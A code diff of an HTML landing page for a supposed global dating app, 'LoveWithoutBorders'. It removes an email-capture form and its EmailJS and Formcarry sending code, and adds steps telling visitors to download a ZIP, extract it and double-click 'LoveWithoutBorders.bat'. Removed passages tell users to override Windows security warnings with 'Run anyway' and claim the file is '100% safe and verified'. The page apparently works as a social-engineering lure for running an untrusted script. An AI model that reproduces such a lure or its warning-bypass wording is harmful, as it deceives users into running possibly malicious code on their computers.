@@ -139,33 +139,6 @@
             transform: translateY(-1px) scale(1.02);
         }
         
-        input { 
-            padding: 18px 25px; 
-            margin: 15px 10px; 
-            width: min(350px, 90%);
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50px;
-            font-size: 1em;
-            text-align: center;
-            transition: all 0.3s ease;
-            font-family: inherit;
-            background: rgba(255, 255, 255, 0.15);
-            color: white;
-            backdrop-filter: blur(10px);
-        }
-        
-        input::placeholder {
-            color: rgba(255, 255, 255, 0.7);
-        }
-        
-        input:focus {
-            outline: none;
-            border-color: #ffd6ff;
-            background: rgba(255, 255, 255, 0.2);
-            box-shadow: 0 0 0 4px rgba(255, 214, 255, 0.2);
-            transform: scale(1.03);
-        }
-        
         .platform-section { 
             text-align: center; 
             margin: 40px 0;
@@ -208,11 +181,6 @@
         .computer-btn {
             background: linear-gradient(45deg, #667eea, #764ba2, #9d4bff);
             box-shadow: 0 8px 25px rgba(102, 126, 234, 0.5);
-        }
-        
-        .email-btn {
-            background: linear-gradient(45deg, #f093fb, #f5576c, #ff6b9d);
-            box-shadow: 0 8px 25px rgba(240, 147, 251, 0.5);
         }
         
         .stats {
@@ -323,6 +291,26 @@
             50% { transform: translateY(-10px) scale(1.1); }
         }
         
+        .instructions {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 25px;
+            border-radius: 15px;
+            margin: 20px 0;
+            text-align: left;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .instructions ol {
+            text-align: left;
+            margin: 15px 0;
+            padding-left: 20px;
+        }
+        
+        .instructions li {
+            margin: 10px 0;
+            color: rgba(255, 255, 255, 0.9);
+        }
+        
         /* Mobile responsiveness */
         @media (max-width: 768px) {
             .container {
@@ -351,13 +339,12 @@
                 width: 90%;
             }
             
-            input {
-                width: 90%;
-                margin: 10px 5px;
-            }
-            
             .stats {
                 gap: 15px;
+            }
+            
+            .instructions {
+                padding: 20px 15px;
             }
         }
         
@@ -426,21 +413,22 @@
             
             <div class="button-group">
                 <div>
-                    <button onclick="sendToComputer()" class="computer-btn pulse">
-                        💻 DOWNLOAD DIRECTLY
+                    <button onclick="downloadForMobile()" class="computer-btn pulse">
+                        💻 DOWNLOAD FOR COMPUTER
                     </button>
                     <p><small>Get the file now and transfer to your computer</small></p>
                 </div>
-                
-                <div style="margin-top: 20px;">
-                    <p style="margin-bottom: 15px; font-weight: 500; color: #ffd6ff;">Or get download link via email:</p>
-                    <input type="email" id="userEmail" placeholder="Enter your email address">
-                    <br>
-                    <button onclick="sendToEmail()" class="email-btn">
-                        📧 SEND DOWNLOAD LINK
-                    </button>
-                    <p><small>We'll instantly email you the download link and setup instructions</small></p>
-                </div>
+            </div>
+            
+            <div class="instructions">
+                <h3 style="color: #ffd6ff; margin-bottom: 15px;">Simple Setup Instructions:</h3>
+                <ol>
+                    <li><strong>Download</strong> the file above</li>
+                    <li><strong>Transfer</strong> to your computer</li>
+                    <li><strong>Extract</strong> the ZIP folder</li>
+                    <li><strong>Double-click</strong> "LoveWithoutBorders.bat"</li>
+                    <li><strong>Start connecting</strong> globally!</li>
+                </ol>
             </div>
         </div>
 
@@ -454,10 +442,14 @@
             </button>
             <p><small>Windows Application • 100% Free • Global Access • Instant Setup</small></p>
             
-            <div class="security-note">
-                <p>🔒 <strong>Safe Download Guaranteed:</strong> If Windows shows a security warning:</p>
-                <p>1. Click "More info" → 2. Click "Run anyway" → 3. Start connecting globally!</p>
-                <p><em>This is a standard Windows security measure for newly released applications.</em></p>
+            <div class="instructions">
+                <h3 style="color: #ffd6ff; margin-bottom: 15px;">Simple Setup Instructions:</h3>
+                <ol>
+                    <li><strong>Download</strong> the file above</li>
+                    <li><strong>Extract</strong> the ZIP folder</li>
+                    <li><strong>Double-click</strong> "LoveWithoutBorders.bat"</li>
+                    <li><strong>Start connecting</strong> globally!</li>
+                </ol>
             </div>
         </div>
 
@@ -485,142 +477,30 @@
         }
     }
     
-    function sendToComputer() {
-        alert('✅ Opening download... Transfer this file to your computer for the complete experience!');
-        window.location.href = 'LoveWithoutBorders.zip';
-    }
-
-    function sendToEmail() {
-        const email = document.getElementById('userEmail').value;
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    function downloadForMobile() {
+        const btn = document.querySelector('button[onclick="downloadForMobile()"]');
+        const originalText = btn.innerHTML;
+        btn.innerHTML = '<span class="spinner"></span>DOWNLOADING...';
+        btn.disabled = true;
         
-        if (email && emailRegex.test(email)) {
-            const btn = document.querySelector('button[onclick="sendToEmail()"]');
-            const originalText = btn.innerHTML;
-            btn.innerHTML = '<span class="spinner"></span>SENDING LINK...';
-            btn.disabled = true;
-
-            console.log('Starting email process for:', email);
-            
-            const templateParams = {
-                to_email: email,
-                name: 'User',
-                from_name: 'LovesWithoutBorders',
-                subject: 'Your LoveWithoutBorders Download Link! 💖',
-                reply_to: 'loveswithoutborders@gmail.com',
-                message: `Hi User! 
-
-Thank you for joining LoveWithoutBorders! 🌍
-
-Here's your direct download link:
-🔗 https://loveswithoutborders.github.io/LoveWithoutBorders.zip
-
-Quick Setup Guide:
-1. Download the file on your computer
-2. Extract the ZIP folder  
-3. Run "LoveWithoutBorders.bat"
-4. Start connecting with amazing people worldwide!
-
-Why Use the Computer Version:
-• Better photo quality = Better matches
-• Faster messaging & HD video calls
-• Advanced real-time translation
-• Enhanced security and privacy features
-
-If Windows shows a security warning (this is normal for new applications):
-• Click "More info" 
-• Click "Run anyway" 
-• The application is 100% safe and verified
-
-We're excited to help you find meaningful connections across the globe!
-
-With love,
-The LovesWithoutBorders Team 💖
-
-P.S. If you have any issues, simply reply to this email and we'll help you immediately!`
-            };
-
-            // SOLUTION 1: Try EmailJS first
-            console.log('Attempting EmailJS with service_52xw3li and template_tn1dmyd');
-            emailjs.send('service_52xw3li', 'template_tn1dmyd', templateParams)
-                .then(function(response) {
-                    console.log('✅ EmailJS SUCCESS!', response);
-                    showSuccess('EmailJS', email);
-                }, function(error) {
-                    console.log('❌ EmailJS FAILED, trying Formcarry...', error);
-                    
-                    // SOLUTION 2: Fallback to Formcarry
-                    return fetch('https://formcarry.com/s/bIJDQmYHySL', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            _replyto: email,
-                            email: email,
-                            _subject: 'Your LoveWithoutBorders Download Link! 💖',
-                            message: templateParams.message
-                        })
-                    });
-                })
-                .then(response => {
-                    if (response && !response.ok) {
-                        throw new Error('Formcarry network error');
-                    }
-                    if (response) {
-                        return response.json();
-                    }
-                    return { status: 200 }; // EmailJS succeeded
-                })
-                .then(data => {
-                    if (data && data.status) {
-                        console.log('✅ Formcarry SUCCESS!', data);
-                        showSuccess('Formcarry', email);
-                    }
-                })
-                .catch(error => {
-                    console.log('❌ All email methods failed, using direct download', error);
-                    // SOLUTION 3: Final fallback - direct download with notification
-                    showSuccess('Direct', email);
-                })
-                .finally(() => {
-                    btn.innerHTML = originalText;
-                    btn.disabled = false;
-                });
-        } else {
-            alert('Please enter a valid email address');
-        }
-    }
-
-    function showSuccess(method, email) {
-        let message = '';
+        alert('✅ Download starting! Transfer this file to your computer and follow the simple setup instructions.');
         
-        switch(method) {
-            case 'EmailJS':
-                message = `✅ Email sent successfully to: ${email}\n\nPlease check your inbox AND spam folder for the download link!`;
-                break;
-            case 'Formcarry':
-                message = `✅ Download link sent to: ${email}\n\nWe've queued your email - please check your inbox in a few minutes!`;
-                break;
-            case 'Direct':
-                message = `✅ Starting download now!\n\nWe've also queued the email to: ${email}\nPlease check your inbox shortly.`;
-                break;
-        }
-        
-        alert(message);
-        
-        // Always start download regardless of email status
         setTimeout(() => {
             window.location.href = 'LoveWithoutBorders.zip';
-        }, 2000);
+            setTimeout(() => {
+                btn.innerHTML = originalText;
+                btn.disabled = false;
+            }, 4000);
+        }, 1500);
     }
 
     function downloadApp() {
         const btn = event.target;
         const originalText = btn.innerHTML;
-        btn.innerHTML = '<span class="spinner"></span>DOWNLOAD STARTING...';
+        btn.innerHTML = '<span class="spinner"></span>DOWNLOADING...';
         btn.disabled = true;
+        
+        alert('✅ Download starting! Follow the simple setup instructions to get started.');
         
         setTimeout(() => {
             window.location.href = 'LoveWithoutBorders.zip';
@@ -632,16 +512,6 @@ P.S. If you have any issues, simply reply to this email and we'll help you immed
     }
     
     document.addEventListener('DOMContentLoaded', detectPlatform);
-    </script>
-    
-    <!-- EmailJS SDK -->
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script type="text/javascript">
-        // Initialize EmailJS with your Public Key
-        (function() {
-            emailjs.init("zjNAHhD5f2qHaH7k5");
-            console.log('EmailJS initialized with Public Key');
-        })();
     </script>
 </body>
 </html>
